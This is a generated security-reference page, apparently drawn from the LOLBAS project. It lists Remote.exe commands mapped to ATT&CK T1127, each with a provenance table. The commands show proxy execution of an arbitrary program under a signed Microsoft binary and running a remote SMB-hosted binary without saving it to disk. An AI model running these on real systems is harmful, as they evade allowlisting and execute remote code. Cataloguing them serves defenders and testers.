---
parsed_by: focuslocust
source: commands
type: generated
---
# Remote Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Remote.exe

Tool page: [Remote.exe](../../tools/windows/remote.exe.md)

### Executes a process under a trusted Microsoft signed binary

```text
Remote.exe /s {PATH:.exe} anythinghere
```

Description:

Spawns specified executable as a child process of remote.exe

Related ATT&CK:

- [T1127](../../attack/techniques/T1127-trusted-developer-utilities-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Remote.yml` |
| Evidence | Command preserved from source parser. |

### Executes a process under a trusted Microsoft signed binary

```text
Remote.exe /s {PATH:.exe} anythinghere
```

Description:

Spawns specified executable as a child process of remote.exe

Related ATT&CK:

- [T1127](../../attack/techniques/T1127-trusted-developer-utilities-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Remote.yml` |
| Evidence | Command preserved from source parser. |

### Executing a remote binary without saving file to disk

```text
Remote.exe /s {PATH_SMB:.exe} anythinghere
```

Description:

Run a remote file

Related ATT&CK:

- [T1127](../../attack/techniques/T1127-trusted-developer-utilities-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Remote.yml` |
| Evidence | Command preserved from source parser. |
